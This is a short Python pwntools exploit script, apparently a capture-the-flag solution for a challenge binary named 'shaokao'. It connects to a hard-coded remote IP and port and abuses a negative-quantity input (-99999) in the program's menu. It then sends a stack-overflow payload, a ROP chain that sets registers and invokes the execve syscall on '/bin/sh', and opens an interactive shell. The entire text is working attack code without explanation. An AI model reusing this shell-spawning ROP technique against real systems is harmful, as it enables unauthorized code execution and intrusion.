from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

# io=process("./shaokao")
io=remote("39.106.71.184",19194)

str_bin_sh=0x4E60F0
pop_rbx_ret=0x402080
pop_rdi_ret=0x40264f
pop_rsi_ret=0x40a67e
rdx_rbx_ret=0x4a404b
pop_rax_ret=0x458827
syscall=0x402404 

io.sendlineafter(b"> ",b"1")
for i in range(3):
    io.recvuntil(b"\n")

# gdb.attach(io)
# pause()

io.sendline(b"1")
io.sendlineafter(b"\n",b"-99999")

io.sendlineafter(b"> ",b"4")
io.sendlineafter(b"> ",b"5")

io.recvuntil(b"\n")
payload=b"/bin/sh\x00"+cyclic(0x20)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(pop_rsi_ret)+p64(0)+p64(rdx_rbx_ret)+p64(0)*2+p64(pop_rax_ret)+p64(0x3b)+p64(syscall)
io.sendline(payload)

io.interactive()